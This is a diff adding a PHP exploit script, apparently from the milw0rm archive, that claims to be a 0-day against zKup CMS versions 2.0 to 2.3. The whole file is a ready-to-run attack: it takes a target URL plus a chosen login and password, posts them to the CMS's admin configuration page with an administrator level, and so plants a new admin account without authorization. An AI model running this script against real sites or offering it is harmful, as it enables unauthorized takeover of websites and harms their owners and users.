@@ -1,0 +1,55 @@
+#!/usr/bin/php
+<?php
+/*
+ * Name:    zKup CMS v2.0 <= v2.3 0-day exploit (add admin)
+ * Credits: Charles "real" F. <charlesfol[at]hotmail.fr>
+ * Date:    03-08-2008
+ * Conditions: None.
+ *
+ * This exploit add a new zKup admin.
+ *
+ */
+
+print "\n";
+print "   zKup CMS v2.0 <= v2.3 0-day exploit (add admin)\n";
+print "       by Charles \"real\" F. <charlesfol[at]hotmail.fr>\n\n";
+
+if($argc<4) { print "usage: php zkup2_admin_exploit.php <url> <login> <passwd>\n   eg: php zkup2_admin_exploit.php http://127.0.0.1/votresite/ real p4ssw0rd";exit(-1); }
+$url = $argv[1];
+$log = $argv[2];
+$pas = $argv[3];
+
+$postit = "action=ajout&login=$log&mdp=$pas&mdp2=$pas&lvl=9";
+
+print "[*] sending evil c0de ... ";
+if(preg_match("#alert#i",post($url."admin/configuration/modifier.php","$postit"))) print "done.\n";
+else print "failed.\n";
+
+function post($url,$data,$get=1)
+{
+	$result = '';
+	preg_match("#^http://([^/]+)(/.*)$#i",$url,$info);
+	$host = $info[1];
+	$page = $info[2];
+	$fp = fsockopen($host, 80, &$errno, &$errstr, 30);
+	
+	$req  = "POST $page HTTP/1.1\r\n";
+	$req .= "Host: $host\r\n";
+	$req .= "User-Agent: Mozilla Firefox\r\n";
+	$req .= "Connection: close\r\n";
+	$req .= "Content-type: application/x-www-form-urlencoded\r\n";
+	$req .= "Content-length: ".strlen( $data )."\r\n";
+	$req .= "\r\n";
+	$req .= $data."\r\n";
+
+	fputs($fp,$req);
+	
+	if($get) while(!feof($fp)) $result .= fgets($fp,128);
+	
+	fclose($fp);
+	return $result;
+}
+
+?>
+
+# milw0rm.com [2008-03-07]
